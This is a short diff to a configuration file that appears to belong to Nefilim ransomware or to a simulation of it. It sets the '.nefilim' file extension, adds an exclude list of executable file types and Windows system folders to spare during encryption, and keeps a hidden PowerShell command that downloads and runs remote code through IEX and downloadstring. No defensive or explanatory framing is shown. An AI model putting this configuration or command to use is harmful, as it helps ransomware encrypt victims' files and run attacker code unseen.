@@ -1,4 +1,11 @@
 file_extension: .nefilim
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 command:
   - -nop -w hidden -c IEX ((new-object net.webclient).downloadstring
 domain:
